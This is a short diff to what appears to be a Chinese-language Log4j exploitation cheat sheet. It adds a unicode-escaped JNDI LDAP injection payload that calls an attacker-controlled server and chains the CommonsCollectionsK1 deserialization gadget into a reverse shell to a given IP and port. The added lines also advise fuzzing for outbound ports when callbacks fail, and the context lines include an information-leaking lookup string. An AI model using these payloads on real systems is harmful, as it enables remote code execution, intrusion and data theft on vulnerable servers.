@@ -19,7 +19,13 @@ unicode编码绕过：
 
 ${sys:user.dir}-${hostName}-${java:os}-${sys:java.version}
 ```
+## 注意
+- 可以尝试CommonsCollectionsK1链
 
+```
+\u0024{jndi:\u006cdap://x.x.x.x:port/Deserialization/CommonsCollectionsK1/ReverseShell/4.2.1.5/12345}
+```
+- 目标可以使用ldap，rmi 发出dnslog,但是不能连接成功【可能是端口问题，FUZZ找到可出来的端口】
 ## ES POC
 
 ```
